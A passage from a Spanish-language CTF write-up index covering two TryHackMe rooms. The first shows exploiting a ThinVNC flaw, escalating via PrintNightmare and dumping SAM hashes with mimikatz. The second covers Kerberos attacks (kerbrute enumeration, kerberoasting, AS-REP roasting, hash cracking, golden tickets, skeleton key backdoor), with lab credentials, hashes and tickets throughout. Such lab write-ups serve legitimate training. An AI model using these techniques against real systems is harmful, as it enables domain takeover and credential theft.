\n/home/rdrgox/Documents/TryHackMe/atlas/exploits/CVE-2019-17662/./CVE-2019-17662.py:73: SyntaxWarning: invalid escape sequence '\\ '\n  else:\n/home/rdrgox/Documents/TryHackMe/atlas/exploits/CVE-2019-17662/./CVE-2019-17662.py:89: SyntaxWarning: invalid escape sequence '\\/'\n  self.args.host = re.sub(\"https?://|\\/$\", \"\", self.args.host)\n\n     _____ _     _    __     ___   _  ____ \n    |_   _| |__ (_)_ _\\ \\   / / \\ | |/ ___|\n      | | | '_ \\| | '_ \\ \\ / /|  \\| | |    \n      | | | | | | | | | \\ V / | |\\  | |___ \n      |_| |_| |_|_|_| |_|\\_/  |_| \\_|\\____|\n\n                            @MuirlandOracle\n\n\n[+] Credentials Found!\nUsername:   Atlas\nPassword:   H0ldUpTheHe@vens\n</code></pre> <p>Elevar privilegios, PrintSpooler es conocido por sus vulnerabilidades de escalada de privilegios. Se ejecuta con los permisos m\u00e1ximos disponibles (bajo la cuenta NT AUTHORITY\\SYSTEM) y es un objetivo frecuente en la investigaci\u00f3n de vulnerabilidades. Se han encontrado numerosas vulnerabilidades en este servicio en el pasado; sin embargo, una de las m\u00e1s recientes se conoce como \"PrintNightmare\".</p> <p>Descargamos exploit <pre><code>git clone https://github.com/calebstewart/CVE-2021-1675.git\n</code></pre></p> <p>Conexi\u00f3n con xfreerdp, y compatimos el recurso.</p> <pre><code># compartimos carpeta /tmp\nxfreerdp /u:Atlas /p:'H0ldUpTheHe@vens' /v:10.201.53.80 /cert-ignore /dynamic-resolution +clipboard /drive:share,/tmp\n\n# compartimos otra carpeta\nxfreerdp /u:Atlas /p:'H0ldUpTheHe@vens' /v:10.201.53.80 /cert-ignore /dynamic-resolution +clipboard /drive:share,/home/rdrgox/Documents/TryHackMe/atlas/ \n</code></pre> <p></p> <p></p> <pre><code>powershell -ep bypass\n. .\\CVE-2021-1675.ps1\nInvoke-Nightmare \n[+] using default new user: adm1n \n[+] using default new password: P@ssw0rd \n[+] created payload at C:\\Users\\Atlas\\AppData\\Local\\Temp\\1\\nightmare.dll \n[+] using pDriverPath = \"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_18b0d38ddfaee729\\Amd64\\mxdwdrv.dll\" \n[+] added user as local administrator \n[+] deleting payload from C:\\Users\\Atlas\\AppData\\Local\\Temp\\1\\nightmare.dll\n</code></pre> <p></p> <p>Usamos un peque\u00f1o truco con un comando de PowerShell para iniciar una nueva ventana de comandos segura que se ejecute como administrador.</p> <pre><code>Start-Process\u00a0powershell\u00a0'Start-Process cmd -Verb RunAs'\u00a0-Credential adm1n\n</code></pre> <p></p> <p>Otra manera de lanzar la cmd como adnmin</p> <pre><code>powershell -ep bypass\n\n. .\\CVE-2021-1675.ps1\n\nInvoke-Nightmare -NewUser \"rdrgox\" -NewPassword \"P@ssw0rd\" -DriverName \"PrintMe\"\n[+] created payload at C:\\Users\\Atlas\\AppData\\Local\\Temp\\1\\nightmare.dll \n[+] using pDriverPath = \"C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_18b0d38ddfaee729\\Amd64\\mxdwdrv.dll\" \n[+] added user as local administrator \n[+] deleting payload from C:\\Users\\Atlas\\AppData\\Local\\Temp\\1\\nightmare.dll\n</code></pre> <pre><code>runas /user:rdrgox powershell.exe\nEnter the password for rdrgox: P@ssw0rd\n</code></pre>","tags":["tryhackme","windows"]},{"location":"TryHackMe/atlas/#post-explotation","title":"Post-explotation","text":"<p>Nos volvemos a conectar con RDP e iniciamos <code>cmd</code> como administrador</p> <pre><code>xfreerdp /u:adm1n /p:'P@ssw0rd' /v:10.201.53.80 /cert-ignore /dynamic-resolution +clipboard /drive:share,/home/rdrgox/Documents/TryHackMe/atlas/ \n</code></pre> <p>Aveces en mimikatz obtenemos el siguiente error. esto ocurre porqque el usuario de windows no tiene los privilegios <code>ERROR_kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061_: The required privilege is not held by the client (mostly you\u2019re not an administrator)</code>.</p> <pre><code>.\\mimikatz.exe\n\nmimikatz # privilege::debug\nPrivilege '20' OK\n\nmimikatz # token::elevate\nToken Id  : 0\nUser name :\nSID name  : NT AUTHORITY\\SYSTEM\n\nmimikatz # lsadump::sam\nDomain : GAIA\nSysKey : 36c8d26ec0df8b23ce63bcefa6e2d821\nLocal SID : S-1-5-21-1966530601-3185510712-10604624\n\nSAMKey : 6e708461100b4988991ce3b4d8b1784e\n\nRID  : 000001f4 (500)\nUser : Administrator\n  Hash NTLM: c16444961f67af7eea7e420b65c8c3eb\n</code></pre> <p></p>","tags":["tryhackme","windows"]},{"location":"TryHackMe/attackingkerberos/","title":"Attacking kerberos","text":"","tags":["tryhackme","windows","active-directory"]},{"location":"TryHackMe/attackingkerberos/#enumeration","title":"Enumeration","text":"","tags":["tryhackme","windows","active-directory"]},{"location":"TryHackMe/attackingkerberos/#nmap","title":"Nmap","text":"<pre><code>nmap -p- --open -sS --min-rate 5000 -n -Pn 10.201.29.113 -oN allPorts.txt                                                                                                  \nPORT      STATE SERVICE\n22/tcp    open  ssh\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n3389/tcp  open  ms-wbt-server\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49667/tcp open  unknown\n49669/tcp open  unknown\n49672/tcp open  unknown\n49673/tcp open  unknown\n49674/tcp open  unknown\n49678/tcp open  unknown\n49688/tcp open  unknown\n49698/tcp open  unknown\n</code></pre> <pre><code>nmap -sC -sV -p22,53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49667,49669,49672,49673,49674,49678,49688,49698 10.201.29.113 -oN target.txt \n\nPORT      STATE SERVICE       VERSION\n22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)\n| ssh-hostkey: \n|   2048 68:f2:8b:17:15:7c:90:d7:4e:0f:8e:d1:4c:6a:be:98 (RSA)\n|   256 b0:3a:a7:c3:88:2e:c1:0b:d7:be:1e:43:1c:f7:5b:34 (ECDSA)\n|_  256 03:c0:ee:58:32:ae:6a:cc:8e:1a:7d:8b:20:c8:a2:bb (ED25519)\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-05 21:17:26Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n3389/tcp  open  ms-wbt-server Microsoft Terminal Services\n| ssl-cert: Subject: commonName=CONTROLLER-1.CONTROLLER.local\n| Not valid before: 2025-10-04T21:11:35\n|_Not valid after:  2026-04-05T21:11:35\n|_ssl-date: 2025-10-05T21:18:36+00:00; -1s from scanner time.\n| rdp-ntlm-info: \n|   Target_Name: CONTROLLER\n|   NetBIOS_Domain_Name: CONTROLLER\n|   NetBIOS_Computer_Name: CONTROLLER-1\n|   DNS_Domain_Name: CONTROLLER.local\n|   DNS_Computer_Name: CONTROLLER-1.CONTROLLER.local\n|   Product_Version: 10.0.17763\n|_  System_Time: 2025-10-05T21:18:26+00:00\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49672/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49673/tcp open  msrpc         Microsoft Windows RPC\n49674/tcp open  msrpc         Microsoft Windows RPC\n49678/tcp open  msrpc         Microsoft Windows RPC\n49688/tcp open  msrpc         Microsoft Windows RPC\n49698/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: CONTROLLER-1; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2025-10-05T21:18:26\n|_  start_date: N/A\n</code></pre> <p>Nos enfrentamos a un DC, averiguamos el nombre del dominio</p> <pre><code>nxc smb 10.201.29.113                                                                                                                                                      \nSMB         10.201.29.113   445    CONTROLLER-1     [*] Windows 10 / Server 2019 Build 17763 x64 (name:CONTROLLER-1) (domain:CONTROLLER.local) (signing:True) (SMBv1:False) \n\nnxc smb 10.201.29.113 --generate-hosts-file name_hosts\nSMB         10.201.29.113   445    CONTROLLER-1     [*] Windows 10 / Server 2019 Build 17763 x64 (name:CONTROLLER-1) (domain:CONTROLLER.local) (signing:True) (SMBv1:False) \n\ncat name_hosts \n10.201.29.113     CONTROLLER-1.CONTROLLER.local CONTROLLER.local CONTROLLER-1\n</code></pre> <p>Descargamos la lista de usuarios que nos entregaron.</p> <pre><code> curl https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/refs/heads/master/User.txt &gt; users.txt\n ```\n\n\n###  kerbrute\n\nBuscamos nombre de usuarios v\u00e1lidos\n\n```bash\nkerbrute userenum -d CONTROLLER.local --dc 10.201.29.113 users.txt \n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: v1.0.3 (9dad6e1) - 10/05/25 - Ronnie Flathers @ropnop\n\n2025/10/05 18:23:49 &gt;  Using KDC(s):\n2025/10/05 18:23:49 &gt;   10.201.29.113:88\n\n2025/10/05 18:23:50 &gt;  [+] VALID USERNAME:  administrator@CONTROLLER.local\n2025/10/05 18:23:50 &gt;  [+] VALID USERNAME:  admin2@CONTROLLER.local\n2025/10/05 18:23:50 &gt;  [+] VALID USERNAME:  admin1@CONTROLLER.local\n2025/10/05 18:23:52 &gt;  [+] VALID USERNAME:  machine1@CONTROLLER.local\n2025/10/05 18:23:52 &gt;  [+] VALID USERNAME:  httpservice@CONTROLLER.local\n2025/10/05 18:23:52 &gt;  [+] VALID USERNAME:  machine2@CONTROLLER.local\n2025/10/05 18:23:52 &gt;  [+] VALID USERNAME:  user3@CONTROLLER.local\n2025/10/05 18:23:52 &gt;  [+] VALID USERNAME:  sqlservice@CONTROLLER.local\n2025/10/05 18:23:52 &gt;  [+] VALID USERNAME:  user2@CONTROLLER.local\n2025/10/05 18:23:52 &gt;  [+] VALID USERNAME:  user1@CONTROLLER.local\n2025/10/05 18:23:52 &gt;  Done! Tested 100 usernames (10 valid) in 3.058 seconds\n</code></pre> <p>Usuarios encontrados</p> <pre><code>cat domian_users.txt | awk '{print $ 7}' | sed 's/@CONTROLLER\\.local//g'\nadministrator\nadmin2\nadmin1\nmachine1\nhttpservice\nmachine2\nuser3\nsqlservice\nuser2\n</code></pre> <pre><code>cat credential.txt \nAdministrator / P@$$W0rd\n</code></pre> <p>Conexi\u00f3n por evil-winrm</p> <pre><code>evil-winrm -u 'administrator' -p 'P@$$W0rd' -i 10.201.29.113   \n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; whoami\ncontroller\\administrator\n</code></pre>","tags":["tryhackme","windows","active-directory"]},{"location":"TryHackMe/attackingkerberos/#rubeus","title":"Rubeus","text":"<pre><code>*Evil-WinRM* PS C:\\Users\\Administrator\\Downloads&gt; .\\Rubeus.exe harvest /interval:30\n</code></pre> <p>Agregamos el dominio al hosts de windows</p> <pre><code>echo '10.201.29.113 CONTROLLER.local' &gt;&gt; C:\\Windows\\System32\\drivers\\etc\\hosts\n\ntype C:\\Windows\\System32\\drivers\\etc\\hosts\n10.201.29.113 CONTROLLER.local\n</code></pre> <p>Nos conectamos por RDP.</p> <pre><code>xfreerdp /u:Administrator /p:'P@$$W0rd' /v:10.201.29.113 /d:CONTROLLER.local /cert-ignore /dynamic-resolution \n</code></pre> <pre><code>.\\Rubeus.exe brute /password:Password1 /noticket\n\n   ______        _\n  (_____ \\      | |\n   _____) )_   _| |__  _____ _   _  ___\n  |  __  /| | | |  _ \\| ___ | | | |/___)\n  | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n  |_|   |_|____/|____/|_____)____/(___/\n\n  v1.5.0\n\n[-] Blocked/Disabled user =&gt; Guest\n[-] Blocked/Disabled user =&gt; krbtgt\n[+] STUPENDOUS =&gt; Machine1:Password1\n[*] base64(Machine1.kirbi):\n\n      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi\n      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx\n      BIID7btpEEDZNpUAXL8igHQVHUgxEntJfYFU/z+mKD7Q3JaqDC8M3bUMGRX4sA+gMjlRk65RVUDxCdIq\n      PpS2s67GUXDWczjakmJ7FHEuqVaftKZITtBWi40FP/X7sNwA3m3FBXfFVcTSNcMQP52XFX2hsiZqjj68\n      36OeLV6FZrKNta+5cKhsV3aYGP56z7WHQ8iNS8i0Xcny8PC8CglIN9Os4f7D3Tp7vT/FpRxfEp1JN7Yq\n      pRbiDXpFHrG8+Rd362QqkQxv2lDRPQJsDLe9zh+0R3C53zFxNESSoaNNP/CgN+lyRoEtpOjXjjKYurmd\n      XwDMedhAetNa3nHpvyhFJPP6D4KnRC8GC1OGgGvXYXI7sJZHhZnUZCkhvMhptP2Hp4/9lUva+huYNyK7\n      jCkmcZPrA/bC30Gjv35ejsyKuI3V3YmghVMcOzQMe3aVJIXpxisv4P5rNNIpPBT4WFqOHyFJS4Fg84ha\n      IidYnPRiQbJSa/d9Uv7qD6wum6R8fQ4S6ZggkViOm9NNRFc7Apbc/js+WtKPo57HO4Hdka73pPaip+wo\n      la0rKc5H2jFDqlbpQENH0V9uHHFoz0+TaSpIu+MSGjRSnYR47Ind46fwAtRwNA3cX+FhwDD2Dr/JdF2R\n      kVgNwKXWzODcc3A22NCpGiqyagQDREQ/34GVa+jF+OYNaqdaXyQ3e8AEnRJldMNfkpbTGAM1mBrtipej\n      1LasyQS6DdXEwcC6GXR6d/eEbApAYSlKt7Xasy/wNI7uY9qlX4CCuSOYvbh1UeMeuYvDrOBHAPMLB1w4\n      zCSRsbWK9GyQT0lXF6IDpFGZSdE1WMhm5Rn9kpq+rF30XjJ/DjGJ0ECprwY5GmgNmxngrM3412ZCQTMx\n      v8fQQB1stgfd8qr1t7T8142+Vwh72v7A8hzCn1nxUQsjHo3cCzUzbza/jAnxsJfDVGQBuDsz9jVR7LoB\n      OPxg8a0m1/R06fFtPCiHjT857Xhz4n+SaNRHRv7QjFNCq7cdlLnEZdwgFowDssubYD/jWtGnYSUOFNYS\n      sbSk53L8iPURtJZ4mTAelz/rhSdJUediGKjmKCw4JKFbJMFoXHK0vPu7Kwbft34UrbgHwEROSTKlL0vB\n      PYkPFoOAbOkH7TwGoztrsT4boNV9uPOamf++CZZyJV6TnbKh3pHRedY1CjFjxfK7WQzi7duL8kj2W9gq\n      wp8GqQZCPmY5BDh5YZhjVZn8PtrCOM2p2TSPgqUkIxAMT5SpU22gaewvVmXMsy4rJgisEaMYjcIcAgKB\n      IaDZwBIDDnMweUgmG2wDJYx5YnUiorX866jLFAgGk7IeAaxTHiNZ2CSDJwSrll7MXqOB8jCB76ADAgEA\n      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIAI5pjGVKypcNWXITJ4GS3dnEGn9Vpxt1+Ci\n      DRzqIXJ+oRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR\n      GA8yMDI1MTAwNTIxNTA1OVqmERgPMjAyNTEwMDYwNzUwNTlapxEYDzIwMjUxMDEyMjE1MDU5WqgSGxBD\n      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs\n\n[+] Done\n</code></pre>","tags":["tryhackme","windows","active-directory"]},{"location":"TryHackMe/attackingkerberos/#kerberoasting-w-rubeus-impacket","title":"Kerberoasting w/ Rubeus &amp; Impacket","text":"<pre><code>.\\Rubeus.exe kerberoast\n</code></pre> <p>Guardamos el Hash generado con Rubeus.</p> <pre><code>cat hash.txt      \n$krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.local:30111*$07D083365FB5F970FC297F75B6A3988C$256F5D89FBD0318A76869C3159EA83D5903EB35FEE8E1958D6E518523A40152C1A90C816D43B266647DE4E5CF152BB4AE5F20DD46A3C12E7F8FE5E15B3954CC8DA55392505C5C99B68D6E6A01D5CB8385D58B483456848855162360A367454E9C9FB2A9551A92F17DB99BC00D9333508880D4ED834736F2122D2B82361DFD1BC175F34748124C7DE122B1D5CF0EFCB0E3E11839DEC1650AB4F4A126339DA99C035EC711543B76C903924CE65EE481361083956CBB9D651FF24DE4D95D017F9E6D4350F77FAB7EDD2D4B3B446952AA9E95DA6C001A9D0D3C503BC918A1245DF65B3A85E1CD4D43E5978AD4F23CC973894F267997404B24510CAA243AEC52A4DBFCF22B45E11472B3479C7AB909695F6168892DEEF0E5F86C002A81CC52745192C3827302982EFB91429CF11D683D223B82F300050C80CBF5C1C5497DA30371BDDEE821C8858C39B31C016D8E7D469258FF9C5E665452B78E62B671404350A937A3A72E3E5D5D009BD2D3741AF9CA9D37D952E45D83F96E749FBCFAB9C161ACC3F4A6428019F353F19C00E272933277EB3EA120ACED5844D097361ACBBF3C335E64D059E09801D1CF674E90E7EF8152B519C27AA3D6F47BCBE987D65251C22736833734C89F0826B1867717A5DBCB3CF52B2A30C5D0440DB5CCDC5EAD000D0FBB2F9B67F69293B93D07D5F0D5449658BBFD2968A9C664EFE058464B4B1CF98D53327E7B0138C08F1DD22DD04C2EF5DA42F4F86CC13C95CEB417C199A033E46DBA190D8852C30D239DC6D2780A6F284E7586490C6B054C23296F3DF660CA522D05F404394ADCBB69D65E363D148EF77B7C3DF0AB812458F499266C81C3A9458B39C19F3CB1343257EF90FF9937F0AAFD43EC44331D07DD379FAD69BAA2E9EF177FFC0D61AD0C833C4E324D211562C1B3D8BC15580BF3D2D568FF544D0F9B6615F822B70935E4131E3DC702DC21AE234D6A205C911C18D0F42DCEE2D1FDB0C337B87111E79E4AFA0276C6F4C3C086E3329660C8231BC487D821A841E871C9B4557C024AF1365B5B9D9D89E55796B6C91010AF697BA6CB1A315A444D23EF21E82EC076E7C0E56727448EF96896C8786C2904711DA468A8DD6977706D104FB8C4105428D5BCB7F39DA564260776C18200FCA08469ED0982645950CADA4B1F41F149726DE647ED25F8160439AF039739A1411C8C48507A76029C6EBC22C0ECE50E6C4CF97C9448660692ECBA0D8876462A6BBBAD8306B9492B1DD59651C769C8FBEA0E483954487A0135C2AC793D4D4D14A798030B32C659427189A4C60E32191893FCEBB2C350F683CAE8702C29800A2992A0B06570AC442530C5990D97FF982B4AB57CB2746EDF1938AD443844056FA517613BB2F374CFF986782BE6B9F84091EF85CB7D53A37BCEA7C5693D036A8EF86FE2450AC0756FD7EE450D1C047BF88BF3E2846DE0AE2A54B13F38FA4A858A8C77857735873F1B3357AB0B63F205AC99453F74517E26F7DA6BCA8D39CF4F12000BEE1B38F05CC1BD5FA018D68649CEB42E26AABDA82E8AEDF3718EF20A4961C5CCCC0CC4A07BB15B04D85F554D5F37E6DA71355AD11B78D49DC884322193E833ACAF555F56FFD6D017D904F9C69E07AE9951FBA1A7ACB8B6B38776E5D57FE00D0C2D5\n</code></pre> <p>Descargamos la lista de passwords que nos entregaron.</p> <pre><code>curl https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/refs/heads/master/Pass.txt &gt; passwords.txt\n</code></pre> <p>Crack de contrase\u00f1as</p> <pre><code>hashcat -m 13100 -a 0 hash.txt  passwords.txt\n</code></pre> <p></p> <p>Agregamos nuestra nueva contrase\u00f1a </p> User Password SQLService MYPassword123# <pre><code>cat hash_http_service.txt \n$krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1HTTPService.CONTROLLER.local:30222*$1472C79BAA8A22CFE8E5C7FFA1DD6FFD$38BE781DDDCEB46953DD3A649DD55B580B3EA222E2ED7D8BDE0ED879971A14416F3C2F4EEA564E4AEADBA6E56BECE39FC191691703D0C144A1ACB7A3EAD2762F3E3CB51946A42C5063794A9E2C4FE2C30C32C10319A466420DB31F00557E3595468FF5ADBECD8DB82CF90644C535D9188C952315F124416E913BF7FE6E0745ECC33D682D758FE6E24E03D20AAE74AD3165766C155CB6047A8A40362F680926CE97EBD2D679C91A9AE1AA22E4D411C07B156CA260052EEBFBFF31A592AC37E281354FC08632FBED6832A281244EF632B7602F2B456F88FBDE7BF69F8DA61550404A17D4487C9F653EF3C3DE4BF1E91C5E8D321DC4FBFEA2512E0B222F0078CAF1780DFDB85C19E57922862BAA7E119EE19BE1434AAE5E69A703A8268F1F58D34960CC5005063B59A226172B5E2074DA0179D1BD4CCEEAC4ECC73A6F620201E2C8296DDB95B1E610053E6B1EDB90715689E082CD920F54A8E642F57EAB97FC98FA5567DFE3C606BD4918CE522C5FF8C76D256FA8EBDA1F74A86A7539E1B91B5EB0FE235CA36B46A774B39BF58685A74DEF82564BB0B137E1114E8B192D3B4645C962B28D7ADD6D1764206A0C1C7D132F4B513FB3C9C6EE5D17F336CDCC0ECCE98DFE6DE46C851BC5F26E693FC54455DE26EF519827CA135486A07188E756767736C7E430A6BC196307AB2791D3285029D2B2D534580FB9F2BF0931498A3DDD8897D8E679144FA14B677A8DEF3E04ECF76EC7575FEE88341D7A7B725079CAAE4EC4C64821832A8222FCB3C0FBF649813AB84E3202DF0C3FD1C65DF60FBF4B1EF0EA0810C3A12E58C31FB75F312FF691D5E52ADE53B49247029048021A1FE511431FF0908F5C5E432F2971B216A667DE7C53AB1B5FC28680FCD1C932940AC39D852D387A371E37373F62CEEDDE3F3CC72000336E5EF62FE6254946F69B65D6536C2ACAC586A19435AD42C4019329AB166735DCFB66E61F578797A393FD18275011FE8DECF12B7AA3EC384A0C5EC40225D15C11D3D407EFE210A03C5BE078CFB819814B1E908E83D8C79D0B84164A568258A01BCCA412595D8B3A87C5ACCB100422136942D77D1E217BD54097BE9F4E7B60217B39A764BBF368ECE66411D1B04E9DF530807ED93A52EB56A1535C083E11F15EA1717C1AEA465AC4645A10EE974BC1710524442C33CA60D46D8FDAB1B623AD80C07199B60DA3D56F49A55A7673CA498993100F3E7010540829087362872D5DE5B0E4D1849A57846269C84E343A9DB8BEC7B619F633AF1862C26ED346BF99EE1E760DD4C82ADE2383C3099C669BD8086F85C994C8E84668F13DCAE44715CDF1BA6F1BA233358FC621058FDCF9C9BF2B21BD33B1D661DEA4AC024E1757F3EDFB2BB94DDA857CFDC84D482508A02302AFE1309AAF9AFF17E83A836AC7D8AB03E71DF39CDF06A193EB66605B4CC8621978F61E942910F98450D8AE39A1A0D72D915A0097C7EE73C057C4270F1C84EDE9CF7D43511F3F8325D8372D5A791136B69DA05F181E4CE67C3B2CB38DC98B6928595D98E75099780ED0CC447126294F532A4D58446059470C714F337F7503EEB883A3990415B77495C147FAC54A7195B482EAF0DF80454E71FF7FCD32C577517157F8E54CAABB180EF2B4B03FF61A94FC2205\n</code></pre> <p>Crack del http service</p> <pre><code>hashcat -m 13100 -a 0 hash_http_service.txt passwords.txt ****\n</code></pre> <p></p> User Password Administrator P@$$W0rd SQLService MYPassword123# HTTPService Summer2020","tags":["tryhackme","windows","active-directory"]},{"location":"TryHackMe/attackingkerberos/#as-rep-roasting-w-rubeus","title":"AS-REP Roasting w/ Rubeus","text":"<pre><code>.\\Rubeus.exe asreproast\n</code></pre> <p>Guardamos nuestros nuevos hash encontrados.</p> <pre><code>cat hash_admin2.txt      \n$krb5asrep$Admin2@CONTROLLER.local:65670B034E85DC7A84C4CAC6DF16B351$47A82FD49F58E4183616252B083617B19B12AC28FDC2523B28A4CA2F77BEE1C526AB411DF8220B51DB2AEA207469FDDB2CE8F023CD62B7E48E62D0127A066A14D6C245EA551A10D74559F6F8013E00C95722D31EEDF44869EB2C47B65F060434233988B8763CD92F34134983492864A53F527A3252A2E7B662BA92D37A9675B8F7C7888FB3562507DA9F4C8FB5DFB4F7A137668841FD62BE22EAF4C182D27E12EB3D8828C64A5EFFB72798E4ED600E2F3BDDF08DFE2C8C2160284483E72591DF0D65CE8C108D4CB40A1D521820F46DF861D493115B95C0F744FE6FC31EEB2789645461385C6214354E39A9C47C7CB5AF82003E9E\n\ncat hash_user3.txt \n$krb5asrep$User3@CONTROLLER.local:6EDC19211E4862742A7AE6CAE88235BD$483DFE9B9D1FC04E2E4FD18EBB3419272EDF63A7A4CA0062831DFF8D2E948B2A468736722BC475E24002ED1D6F4CF24A78F0FBE48D29688E12CE5E23F41A9CF90C060E81AD20C39FAE5F572714CEB3C48BA6ACF344E858E30BD11F4F826EE26320645F459263200BC41B72E608EAFF504751AAD4DECD9B527F90F32518EFF3C64FA308A51A6E289A5B49BC57177025AD0C695A65D8CE3880B425E0FC5092C4DA47DA2604D3BBF9FDE1A4F4EDF4A33887016CEF88BA979A5B1B36A97FBA579915A83E1FDF64D0C847D4887CDEFE5896C3E61CD9657173DB553ACCB6437C56E674B66B429A8B709C04D2925DF559C5BD6BB6B0E5BF\n</code></pre> <p>Crack de los Hash</p> <pre><code>hashcat -m 18200 -a 0 hash_admin2.txt passwords.txt  \n</code></pre> <p></p> <pre><code>hashcat -m 18200 -a 0 hash_user3.txt passwords.txt\n</code></pre> <p></p> User Password Admin2 P@SSW0rd2 User3 Password3","tags":["tryhackme","windows","active-directory"]},{"location":"TryHackMe/attackingkerberos/#mimikatz","title":"Mimikatz","text":"<p>Pass the Ticket w/ mimikatz</p> <pre><code>.\\mimikatz.exe\n\nmimikatz # privilege::debug\n\nmimikatz # sekurlsa::tickets /export\n</code></pre> <p></p> <p></p> <pre><code>mimikatz # kerberos::ptt [0;7fbb3]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi\n</code></pre> <p></p> <p></p> <pre><code>dir \\\\10.201.99.85\\admin$\n</code></pre> <p></p> <p>Golden/Silver Ticket Attacks w/ mimikatz</p> <pre><code>.\\mimikatz.exe\n\nprivilege::debug\n\nlsadump::lsa /inject /name:krbtgt\n</code></pre> <p></p> <p>Guardamos el SID y el NTLM</p> <pre><code>/sid: S-1-5-21-432953485-3795405108-1502158860\n/krbtgt: 72cd714611b64cd4d5550cd2759db3f6\n</code></pre> <pre><code>kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500\n</code></pre> <p></p> <pre><code>misc::cmd\n</code></pre> <p></p> <pre><code>lsadump::lsa /inject /name:administrator\nDomain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860\nNTLM : 2777b7fec870e04dda00cd7260f7bee6\n\nlsadump::lsa /inject /name:sqlservice\nDomain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860\nNTLM : cd40c9ed96265531b21fc5b1dafcfb0a\n</code></pre> <p></p> <p></p> <pre><code>kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:2777b7fec870e04dda00cd7260f7bee6 /id:500\n</code></pre> <p></p> <p>Kerberos Backdoors w/ mimikatz</p> <pre><code>.\\Mimikatz.exe\n\nprivilege::debug\n\nmisc::skeleton\n</code></pre> <p></p> <p>Accessing the forest -\u00a0</p> <p>The default credentials will be: \"mimikatz\"  </p> <p>example:\u00a0<code>net use c:\\\\DOMAIN-CONTROLLER\\admin$\u00a0/user:Administrator mimikatz</code>\u00a0- The share will now be accessible without the need for the Administrators password</p> <p>example:\u00a0<code>dir \\\\Desktop-1\\c$ /user:Machine1 mimikatz</code>\u00a0- access the directory of Desktop-1 without ever knowing what users have access to Desktop-1</p> <p>The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.</p>","tags":["tryhackme","windows","active-directory"]}]}